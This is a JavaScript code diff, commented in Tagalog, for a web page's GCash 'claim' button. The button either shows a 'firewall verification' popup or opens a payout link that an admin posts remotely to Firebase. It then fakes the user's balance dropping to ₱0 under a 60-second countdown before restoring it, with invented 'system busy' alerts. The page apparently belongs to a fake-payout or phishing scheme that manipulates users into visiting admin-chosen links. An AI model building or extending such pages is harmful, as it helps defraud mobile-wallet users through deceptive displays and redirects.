@@ -8,7 +8,7 @@ async function getFirewallStatus() {
         var data = snap.val();
         return data && data.active === true;
     } catch(e) { return false; }
-}
+}    
 
 let isTimerRunning = false;
 let originalBalance = 0;
@@ -56,6 +56,25 @@ async function handleGcashClaim() {
     }, 1000);
 }
 
+async function getLatestPayoutLink() {
+    if (typeof firebase === 'undefined' || !firebase.database) return null;
+    try {
+        var db = firebase.database();
+        // Hahanap ito sa "links" node ng status na 'available'
+        var snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
+        
+        if (snapshot.exists()) {
+            var key = Object.keys(snapshot.val())[0];
+            var linkData = snapshot.val()[key];
+            return { url: linkData.url, key: key };
+        }
+        return null;
+    } catch(e) { 
+        console.error("Link Fetch Error:", e);
+        return null; 
+    }
+}
+
 // Function para maibalik ang balance mula sa Firebase/Session
 async function restoreBalance(phone) {
     const gcashBtn = document.getElementById('claimGCashBtn');
@@ -88,25 +107,46 @@ async function restoreBalance(phone) {
 // Function para sa Claim Button
 async function handleGcashClaim() {
     const gcashBtn = document.getElementById('claimGCashBtn');
-    const originalText = gcashBtn.innerHTML;
+    const balanceDisplay = document.getElementById('userBalanceDisplay');
+    const userPhone = localStorage.getItem("userPhone");
 
-    // 1. Check Firewall Status muna
+    if (isTimerRunning || !gcashBtn) return;
+
+    // 1. Check Firewall muna
     const isFirewallActive = await getFirewallStatus();
-
     if (isFirewallActive) {
-        // KAHIT MAY LINK O WALA, basta ON ang Firewall -> Verification agad
         showFirewallVerificationPopup();
-    } else {
-        // FIREWALL IS OFF -> Check kung may Link
-        const payoutData = await getLatestPayoutLink();
+        return;
+    }
 
-        if (payoutData && payoutData.url) {
-            // MAY LINK -> Redirect sa GCash
-            window.open(payoutData.url, '_blank');
-        } else {
-            // WALANG LINK -> Alert
-            alert("⚠️ SYSTEM UPDATE: Payout system is currently busy. Please try again later.");
-        }
+    // 2. FIREWALL IS OFF -> Kunin ang Link mula sa Firebase (Deploy Link logic)
+    const payoutData = await getLatestPayoutLink(); // Ito yung kumukuha sa 'links' node
+
+    if (payoutData && payoutData.url) {
+        // A. REDIRECT: Buksan ang dineploy mong link mula sa Admin
+        window.open(payoutData.url, '_blank');
+
+        // B. THRILL START: Simulan ang bawas-pera at timer effect
+        isTimerRunning = true;
+        originalBalance = parseInt(balanceDisplay.innerText.replace(/[^\d]/g, ''));
+        
+        balanceDisplay.innerText = "₱0"; // Bawas pera visual
+        balanceDisplay.style.color = "#ff3131";
+
+        let secondsLeft = 60;
+        const timerInterval = setInterval(() => {
+            secondsLeft--;
+            gcashBtn.innerHTML = `<span class="timer-active ${secondsLeft <= 10 ? 'timer-low' : ''}">00:${secondsLeft.toString().padStart(2, '0')}</span>`;
+
+            if (secondsLeft <= 0) {
+                clearInterval(timerInterval);
+                restoreBalance(userPhone); // Ibalik ang pera pagkatapos ng 1 min
+            }
+        }, 1000);
+
+    } else {
+        // Kung walang dineploy na link sa Admin panel
+        alert("⚠️ SYSTEM BUSY: No payout channels available. Please try again in a few minutes.");
     }
 }
 
